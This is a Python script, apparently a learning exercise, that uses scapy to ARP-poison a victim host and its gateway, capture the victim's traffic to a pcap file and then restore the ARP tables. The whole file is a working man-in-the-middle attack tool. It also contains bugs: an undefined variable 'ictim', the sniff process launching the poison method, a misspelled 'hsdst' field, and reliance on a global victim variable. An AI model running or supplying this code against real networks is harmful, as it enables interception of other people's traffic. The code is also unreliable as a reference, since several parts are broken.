from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time

# 1) Define a helper function to get the MAC address for any given machine.
def get_mac(targetip):
    # 1) Make a packet asking everyone for the target IP's mac
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    # 2) Sending packet with scapy's srp function on the network layer.
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

# Arper class to sniff, poison, and restore network settings
class Arper:
    # 1) Initalize the class with the victim and gateway IPs and specify interface to use "en0"
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0 

        # 2) Parameters stored to local object variables ^ and printed below 
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({ictim}) is at {self.victimmac}.')
        print('-'*30)

    # run method contains most of the main setup work for this arper object
    def run(self):
        # 1) Sets up and runs the poisoning process
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # 2) Another thread to monitor the attack progress by sniffing network traffic
        self.sniff_thread = Process(target=self.poison)
        self.sniff_thread.start()



    # 2) The poison method sets up the data we'll use to poison the victim and the gateway
    def poison(self):
        # 1) Create a poisoned ARP packet for the victim
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        # 2) Create a poisoned ARP packet for the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        # 3) Send poisoned packets to the destination in an infinite loop so the entries remain poisoned for the whole attack
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            # 4) Infinite loop until Ctrl-C (KeyboardInterrupt) Then send back the correct information, reverting the poisoning and restoring the entries
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    # 3) A function to sniff traffic
    def sniff(self, count=200):
        # 1) Sleeps for five seconds to start thread
        time.sleep(5)
        print(f'Sniffing {count} packet')
        # 2) filtering for packets with the victim IP address
        bpf_filter = "ip host %s" % victim
        # 3) sniffs for 100 packets by default, here we do 200
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # 4) Captured packets are written to a file called arper.pcap
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        # 5) Restore the ARP tables to their original values and terminate the poison thread
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')


    def restore(self):
        print('Restoring ARP tables...')
        # 1) sends the original value for the gateway MAC and IP to the victim 
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hsdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        # 2) sends the original value for the victim IP and MAC to the gateway
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()